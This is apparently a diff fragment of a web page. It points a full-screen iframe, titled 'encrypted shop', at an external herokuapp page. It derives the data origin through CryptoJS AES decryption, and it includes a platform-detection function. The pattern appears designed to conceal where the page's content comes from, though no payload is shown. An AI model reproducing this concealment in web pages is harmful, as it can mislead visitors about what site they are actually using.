@@ -9,7 +9,7 @@
   </style>
 </head>
 <body>
- <iframe id="frame" 
+ <iframe id="frame" src="https://wisdomvector-c888cd8645c7.herokuapp.com/server-api.html"
         style="display:block;width:100%;height:100vh;border:0;"
         title="encrypted shop"
         allowfullscreen
@@ -30,7 +30,7 @@ const DATA_ORIGIN = CryptoJS.AES.decrypt(
 
 const DATA_URL = DATA_ORIGIN + "/data";
 
-let lastUrl = "/server-api.html";
+let lastUrl = null;
 
 function detectPlatform() {
     const p =
